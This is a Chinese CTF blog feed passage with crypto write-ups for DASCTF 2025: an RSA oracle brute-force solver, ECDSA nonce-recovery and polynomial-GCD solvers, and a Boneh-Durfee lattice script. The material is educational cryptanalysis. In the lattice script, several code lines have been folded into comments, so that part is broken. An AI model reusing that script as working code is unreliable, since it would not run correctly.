c0 = <span class="built_in">pow</span>(<span class="number">2</span>**(<span class="number">512</span> - <span class="number">8</span> * i), e, n)  </span><br><span class="line">    c = ct * c0 % n  </span><br><span class="line">  </span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Enter message to sign: &#x27;</span>, <span class="built_in">str</span>(c).encode())  </span><br><span class="line">    data = io.recvline().decode()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> printable:  </span><br><span class="line">        tmp = c + flag + <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">64</span> - <span class="built_in">len</span>(flag) - <span class="number">1</span>)  </span><br><span class="line">        tmp_ct = <span class="built_in">pow</span>(bytes_to_long(tmp.encode()), e, n)  </span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Enter message to sign: &#x27;</span>, <span class="built_in">str</span>(tmp_ct).encode())  </span><br><span class="line">        res = io.recvline().decode()  </span><br><span class="line">        <span class="keyword">if</span> res.strip() == data.strip():  </span><br><span class="line">            flag = c + flag  </span><br><span class="line">            log.success(<span class="string">f&quot;Update flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)  </span><br><span class="line">            isUpdate = <span class="literal">True</span>  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isUpdate:  </span><br><span class="line">        <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">log.success(<span class="string">f&quot;Final flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>在我的电脑上大概20分钟左右就可以爆破出flag：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250730113910102.png" alt="image" /><figcaption>image</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 2025上半年赛Crypto部分Write Up</title>
      <link href="/2025/07/07/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9BCrypto-%E9%83%A8%E5%88%86Write-Up/"/>
      <url>/2025/07/07/DASCTF-2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9BCrypto-%E9%83%A8%E5%88%86Write-Up/</url>
      
        <content type="html"><![CDATA[<h2 id="Excessive-Security"><a href="#Excessive-Security" class="headerlink" title="Excessive Security"></a>Excessive Security</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint  </span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, bytes_to_long, getPrime  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line">curve = SECP256k1  </span><br><span class="line">G, n = curve.generator, curve.order  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">H</span>(<span class="params">msg</span>): <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(sha256(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">h, priv, k</span>):  </span><br><span class="line">    r = (k * G).x() % n  </span><br><span class="line">    s = (inverse(k, n) * (h + r * priv)) % n  </span><br><span class="line">    <span class="keyword">return</span> s, r  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split</span>(<span class="params">data</span>):  </span><br><span class="line">    s = data.decode() <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">bytes</span>) <span class="keyword">else</span> data  </span><br><span class="line">    <span class="keyword">return</span> [s[i::<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_encrypt</span>(<span class="params">plaintext</span>):  </span><br><span class="line">    blocks = split(plaintext)  </span><br><span class="line">    h = <span class="built_in">list</span>(<span class="built_in">map</span>(H, blocks))  </span><br><span class="line">  </span><br><span class="line">    x1 = randint(<span class="number">1</span>, n - <span class="number">1</span>)  </span><br><span class="line">    x2 = randint(<span class="number">1</span>, n - <span class="number">1</span>)  </span><br><span class="line">      </span><br><span class="line">    k1 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>)  </span><br><span class="line">    k2 = randint(n // <span class="number">8</span>, n - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    s1, r1 = sign(h[<span class="number">0</span>], x1, k1)  </span><br><span class="line">    s2, _  = sign(h[<span class="number">1</span>], x2, k1)  </span><br><span class="line">    s3, r2 = sign(h[<span class="number">2</span>], x1, k2)  </span><br><span class="line">    s4, _  = sign(h[<span class="number">3</span>], x2, k2)  </span><br><span class="line">  </span><br><span class="line">    m = bytes_to_long(plaintext)  </span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)  </span><br><span class="line">    N = p * q  </span><br><span class="line">    e = <span class="number">65537</span>  </span><br><span class="line">    c1 = <span class="built_in">pow</span>(m, e, N)  </span><br><span class="line">    c2 = <span class="built_in">pow</span>(x1 * m + x2, e, N)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h1, s1, r1) = (<span class="subst">&#123;h[<span class="number">0</span>]&#125;</span>, <span class="subst">&#123;s1&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h2, s2, r1) = (<span class="subst">&#123;h[<span class="number">1</span>]&#125;</span>, <span class="subst">&#123;s2&#125;</span>, <span class="subst">&#123;r1&#125;</span>)&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h3, s3, r2) = (<span class="subst">&#123;h[<span class="number">2</span>]&#125;</span>, <span class="subst">&#123;s3&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;(h4, s4, r2) = (<span class="subst">&#123;h[<span class="number">3</span>]&#125;</span>, <span class="subst">&#123;s4&#125;</span>, <span class="subst">&#123;r2&#125;</span>)&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    sign_encrypt(flag)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># N = ...  </span></span><br><span class="line">    <span class="comment"># c1 = ...    </span></span><br><span class="line">    <span class="comment"># c2 = ...    </span></span><br><span class="line">    <span class="comment"># (h1, s1, r1) = (..., ..., ...)    </span></span><br><span class="line">    <span class="comment"># (h2, s2, r1) = (..., ..., ...)    </span></span><br><span class="line">    <span class="comment"># (h3, s3, r2) = (..., ..., ...)    </span></span><br><span class="line">    <span class="comment"># (h4, s4, r2) = (..., ..., ...)</span></span><br></pre></td></tr></table></figure><p>对签名步骤，有（四式从上到下分别编号为1、2、3、4）：</p><script type="math/tex; mode=display">\begin{cases}s_1\equiv k_1^{-1}(h_1+r_1x_1)\pmod{n}\\s_2\equiv k_1^{-1}(h_2+r_1x_2)\pmod{n}\\s_3\equiv k_2^{-1}(h_3+r_2x_1)\pmod{n}\\s_4\equiv k_2^{-1}(h_4+r_2x_2)\pmod{n}\end{cases}</script><p>可以得到：</p><script type="math/tex; mode=display">\begin{cases}k_1s_1\equiv h_1+r_1x_1\pmod{n}\\k_1s_2\equiv h_2+r_1x_2\pmod{n}\\k_2s_3\equiv h_3+r_2x_1\pmod{n}\\k_2s_4\equiv h_4+r_2x_2\pmod{n}\\\end{cases}</script><p>1、2式两边乘上$r’$，3、4式两边乘上$r$，有：</p><script type="math/tex; mode=display">\begin{cases}r_2k_1s_1\equiv r_2h_1+r_1r_2x_1\pmod{n}\\r_2k_1s_2\equiv r_2h_2+r_1r_2x_2\pmod{n}\\r_1k_2s_3\equiv r_1h_3+r_1r_2x_1\pmod{n}\\r_1k_2s_4\equiv r_1h_4+r_1r_2x_2\pmod{n}\\\end{cases}</script><p>1、3式相减，2、4式相减可以消去$rr’x_1,rr’x_2$：</p><script type="math/tex; mode=display">\begin{cases}r_2k_1s_1-r_1k_2s_3\equiv r_2h_1-r_1h_3\pmod{n}\\r_2k_1s_2-r_1k_2s_4\equiv r_2h_2-r_1h_4\pmod{n}\\\end{cases}</script><p>1式乘上$s_4$，2式乘上$s_3$后相减：</p><script type="math/tex; mode=display">r_2k_1(s_1s_4-s_2s_3)\equiv (r_2h_1-r_1h_3)s_4-(r_2h_2-r_1h_4)s_3\pmod{n}</script><p>由于$r_1,r_2,s_1,s_2,s_3,s_4,h_1,h_2,h_3,h_4$均已知，那么可以求出$k_1$：</p><script type="math/tex; mode=display">k_1\equiv \frac{(r_2h_1-r_1h_3)s_4-(r_2h_2-r_1h_4)s_3}{r_2(s_1s_4-s_2s_3)}</script><p>从而可以计算出：</p><script type="math/tex; mode=display">\begin{cases}x_1\equiv (k_1s_1 - h_1)r_1^{-1}\pmod{n}\\x_2\equiv (k_1s_2 - h_2)r_1^{-1}\pmod{n}\\\end{cases}</script><p>那么对于加密部分我们就可以得到两个方程：</p><script type="math/tex; mode=display">\begin{aligned}&f\equiv m^{e}-c_1\equiv0\pmod{N}\\&g\equiv (x_1m+x_2)^{e}-c_2\equiv 0\pmod{N}\end{aligned}</script><p>可以看到$f,g$有一个共同的根$m$，那么只需要求出$f,g$的最大公约式再求根就可以得到$m$，从而得到flag了：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"></span><br><span class="line">n = SECP256k1.order</span><br><span class="line">N = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line">(h1, s1, r1) = (..., ..., ...)</span><br><span class="line">(h2, s2, r1) = (..., ..., ...)</span><br><span class="line">(h3, s3, r2) = (..., ..., ...)</span><br><span class="line">(h4, s4, r2) = (..., ..., ...)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">k1 = (s4 * (r2*h1 - r1*h3) - s3 * (r2*h2 - r1*h4)) * inverse(r2 * (s1*s4 - s2*s3), n) % n</span><br><span class="line"></span><br><span class="line">x1 = (k1 * s1 - h1) * inverse(r1, n) % n</span><br><span class="line">x2 = (k1 * s2 - h2) * inverse(r1, n) % n</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x^e - c1</span><br><span class="line">g = (x1 * x + x2)^e - c2</span><br><span class="line"></span><br><span class="line">G = R(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">m = -<span class="built_in">list</span>(G.monic())[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><br>我在比赛前没有存HGCD的板子，在搜板子的时候惊喜地发现原来sage是提供了快速计算两多项式的最大公约式的方法的，这样以后求两多项式最大公约式的时候就不用这么麻烦了.</p><h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><p>实际上在求$x_1,x_2$一步还有另外一种更直接的解法，已知有关系：</p><script type="math/tex; mode=display">\begin{cases}k_1s_1\equiv h_1+r_1x_1\pmod{n}\\k_1s_2\equiv h_2+r_1x_2\pmod{n}\\k_2s_3\equiv h_3+r_2x_1\pmod{n}\\k_2s_4\equiv h_4+r_2x_2\pmod{n}\\\end{cases}</script><p>移项可以得到：</p><script type="math/tex; mode=display">\begin{cases}s_1k_1&&-r_1x_1&&\equiv h_1\pmod{n}\\s_2k_1&&&-r_1x_2&\equiv h_2\pmod{n}\\&s_3k_2&-r_2x_1&&\equiv h_3\pmod{n}\\&s_4k_2&&-r_2x_2&\equiv h_4\pmod{n}\end{cases}</script><p>转换为矩阵形式就是：</p><script type="math/tex; mode=display">\left(\begin{matrix}s_1&0&-r_1&0\\s_2&0&0&-r_1\\0&s_3&-r_2&0\\0&s_4&0&-r_2\end{matrix}\right)\left(\begin{matrix}k_1\\k_2\\x_1\\x_2\end{matrix}\right)\equiv\left(\begin{matrix}h_1\\h_2\\h_3\\h_4\end{matrix}\right)\pmod{n}</script><p>直接求解即可：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ecdsa <span class="keyword">import</span> SECP256k1</span><br><span class="line"></span><br><span class="line">n = SECP256k1.order</span><br><span class="line">N = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line">(h1, s1, r1) = (..., ..., ...)</span><br><span class="line">(h2, s2, r1) = (..., ..., ...)</span><br><span class="line">(h3, s3, r2) = (..., ..., ...)</span><br><span class="line">(h4, s4, r2) = (..., ..., ...)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = matrix(Zmod(n), [[s1, <span class="number">0</span>, -r1, <span class="number">0</span>], [s2, <span class="number">0</span>, <span class="number">0</span>, -r1], [<span class="number">0</span>, s3, -r2, <span class="number">0</span>], [<span class="number">0</span>, s4, <span class="number">0</span>, -r2]])</span><br><span class="line">v = vector(Zmod(n), [h1, h2, h3, h4])</span><br><span class="line">k1, k2, x1, x2 = A.solve_right(v)</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(N)[]</span><br><span class="line">f = x^e - c1</span><br><span class="line">g = (ZZ(x1) * x + ZZ(x2))^e - c2</span><br><span class="line"></span><br><span class="line">G = R(f._pari_with_name(<span class="string">&#x27;x&#x27;</span>).gcd(g._pari_with_name(<span class="string">&#x27;x&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">m = -<span class="built_in">list</span>(G.monic())[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure></p><h2 id="Strange-RSA"><a href="#Strange-RSA" class="headerlink" title="Strange RSA"></a>Strange RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, GCD, bytes_to_long, inverse  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_flag_params</span>(<span class="params">keysize=<span class="number">256</span></span>):  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        p, q = getPrime(keysize), getPrime(keysize)  </span><br><span class="line">        N = p * q  </span><br><span class="line">        A = (p**<span class="number">4</span> - <span class="number">1</span>) * (q**<span class="number">4</span> - <span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">            u = random.randint(<span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">26</span>)  </span><br><span class="line">            v = random.randint(<span class="number">2</span>, <span class="number">1</span> &lt;&lt; <span class="number">26</span>)  </span><br><span class="line">            <span class="keyword">if</span> GCD(u, v) == <span class="number">1</span>:  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">        w = random.randint(-(v * N) + <span class="number">1</span>, v * N - <span class="number">1</span>)  </span><br><span class="line">        numerator = w + A * v  </span><br><span class="line">        <span class="keyword">if</span> numerator % u != <span class="number">0</span>:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        e = numerator // u  </span><br><span class="line">        <span class="keyword">if</span> e &lt;= <span class="number">0</span> <span class="keyword">or</span> GCD(A, e) != <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;N&#x27;</span>: N, <span class="string">&#x27;u&#x27;</span>: u, <span class="string">&#x27;v&#x27;</span>: v, <span class="string">&#x27;e&#x27;</span>: e&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_hint_params</span>(<span class="params">u, v, keysize=<span class="number">512</span></span>):  </span><br><span class="line">    p, q = getPrime(keysize), getPrime(keysize)  </span><br><span class="line">    N = p*q  </span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">    e1, e2 = <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            x = getPrime(<span class="number">256</span>)  </span><br><span class="line">            d1 = (v+u)*x  </span><br><span class="line">            d2 = (v-u)*x  </span><br><span class="line">            e1 = inverse(d1, phi)  </span><br><span class="line">            e2 = inverse(d2, phi)  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;e1&#x27;</span>: e1, <span class="string">&#x27;e2&#x27;</span>: e2, <span class="string">&#x27;N&#x27;</span>: N&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">flag, hint</span>):  </span><br><span class="line">    params = generate_flag_params()  </span><br><span class="line">    N1, u, v, e1 = params[<span class="string">&#x27;N&#x27;</span>], params[<span class="string">&#x27;u&#x27;</span>], params[<span class="string">&#x27;v&#x27;</span>], params[<span class="string">&#x27;e&#x27;</span>]  </span><br><span class="line">    e2, e3, N2 = generate_hint_params(u, v)  </span><br><span class="line">  </span><br><span class="line">    flag_ct = <span class="built_in">pow</span>(bytes_to_long(flag), e1, N1)  </span><br><span class="line">    hint_ct = <span class="built_in">pow</span>(bytes_to_long(hint), random.choice([e2, e3]), N2)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> &#123;  </span><br><span class="line">        <span class="string">&#x27;flag_ct&#x27;</span>: flag_ct,  </span><br><span class="line">        <span class="string">&#x27;hint_ct&#x27;</span>: hint_ct,  </span><br><span class="line">        <span class="string">&#x27;N1&#x27;</span>: N1,  </span><br><span class="line">        <span class="string">&#x27;N2&#x27;</span>: N2,  </span><br><span class="line">        <span class="string">&#x27;e1&#x27;</span>: e1,  </span><br><span class="line">        <span class="string">&#x27;e2&#x27;</span>: e2,  </span><br><span class="line">        <span class="string">&#x27;e3&#x27;</span>: e3  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    res = encrypt(flag, hint)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;flag ciphertext: <span class="subst">&#123;res[<span class="string">&quot;flag_ct&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint ciphertext: <span class="subst">&#123;res[<span class="string">&quot;hint_ct&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N1: <span class="subst">&#123;res[<span class="string">&quot;N1&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N2: <span class="subst">&#123;res[<span class="string">&quot;N2&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e1: <span class="subst">&#123;res[<span class="string">&quot;e1&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e2: <span class="subst">&#123;res[<span class="string">&quot;e2&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e3: <span class="subst">&#123;res[<span class="string">&quot;e3&quot;</span>]&#125;</span>&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># flag_ct = ...  </span></span><br><span class="line">    <span class="comment"># hint_ct = ...    </span></span><br><span class="line">    <span class="comment"># N1 = ...    </span></span><br><span class="line">    <span class="comment"># N2 = ...    </span></span><br><span class="line">    <span class="comment"># e1 = ...    </span></span><br><span class="line">    <span class="comment"># e2 = ...    </span></span><br><span class="line">    <span class="comment"># e3 = ...</span></span><br></pre></td></tr></table></figure><p>对flag，其生成了两个互质整数$u,v&lt;2^{26}$，并且在$[-vN+1,vN-1)$（$N$在代码中是$N_1$）的范围内生成一个随机整数$w$，得到$e=\frac{v(p^4-1)(q^4-1)+w}{u}$，并使用这个$e$对flag进行加密。而hint就是一般的RSA，但是有$d_1=(v+u)x,d_2=(v-u)x$，可以知道$d_1,d_2&lt; 2^{256+26}=2^{282}\approx N^{0.275}$（实际上在代码中是$N_2$），之后分别对两个私钥计算出对应公钥$e_1,e_2$，并在两个公钥中随机选出一个对hint加密。</p><p>首先我们考虑求出hint，因为在对hint加密时对公钥是二选一的，所以两个私钥我们都要求出来，通过上面求出的界，可以考虑使用Boneh-Durfee来求出两个$d_1,d_2$，从而直接解密求出hint：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Setting debug to true will display more informations  </span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">debug = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and  </span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct  </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this  </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions  </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is  </span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why  </span></span><br><span class="line"><span class="string">you should probably use `strict = False`  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">strict = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results  </span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can  </span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use  </span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try  </span></span><br><span class="line"><span class="string">disabling it  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">helpful_only = <span class="literal">True</span>  </span><br><span class="line">dimension_min = <span class="number">7</span>  <span class="comment"># stop removing if lattice reaches that dimension  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">############################################  </span></span><br><span class="line"><span class="comment"># Functions  </span></span><br><span class="line"><span class="comment">##########################################  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># display stats on helpful vectors  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):  </span><br><span class="line">    nothelpful = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= modulus:  </span><br><span class="line">            nothelpful += <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># display matrix picture with 0 and X  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):  </span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)  </span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):  </span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii, jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span>  </span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:  </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span>  </span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:  </span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span>  </span><br><span class="line">        <span class="built_in">print</span>(a)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors  </span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):  </span><br><span class="line">    <span class="comment"># end of our recursive function  </span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:  </span><br><span class="line">        <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># we start by checking from the end  </span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):  </span><br><span class="line">        <span class="comment"># if it is unhelpful:  </span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:  </span><br><span class="line">            affected_vectors = <span class="number">0</span>  </span><br><span class="line">            affected_vector_index = <span class="number">0</span>  </span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors  </span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">                <span class="comment"># if another vector is affected:  </span></span><br><span class="line">                <span class="comment"># we increase the count                if BB[jj, ii] != 0:  </span></span><br><span class="line">                    affected_vectors += <span class="number">1</span>  </span><br><span class="line">                    affected_vector_index = jj  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># level:0  </span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected            # we remove it            if affected_vectors == 0:  </span></span><br><span class="line">                <span class="comment"># print(&quot;* removing unhelpful vector&quot;, ii)  </span></span><br><span class="line">                BB = BB.delete_columns([ii])  </span><br><span class="line">                BB = BB.delete_rows([ii])  </span><br><span class="line">                monomials.pop(ii)  </span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)  </span><br><span class="line">                <span class="keyword">return</span> BB  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># level:1  </span></span><br><span class="line">            <span class="comment"># if just one was affected we check            </span></span><br><span class="line">        <span class="comment"># if it is affecting someone else            elif affected_vectors == 1:  </span></span><br><span class="line">                affected_deeper = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):  </span><br><span class="line">                    <span class="comment"># if it is affecting even one vector  </span></span><br><span class="line">                    <span class="comment"># we give up on this one                    if BB[kk, affected_vector_index] != 0:  </span></span><br><span class="line">                        affected_deeper = <span class="literal">False</span>  </span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and  </span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough                </span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(  </span></span><br><span class="line">                        bound - BB[ii, ii]):  </span><br><span class="line">                    <span class="comment"># print(&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)  </span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])  </span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])  </span><br><span class="line">                    monomials.pop(affected_vector_index)  </span><br><span class="line">                    monomials.pop(ii)  </span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii - <span class="number">1</span>)  </span><br><span class="line">                    <span class="keyword">return</span> BB  </span><br><span 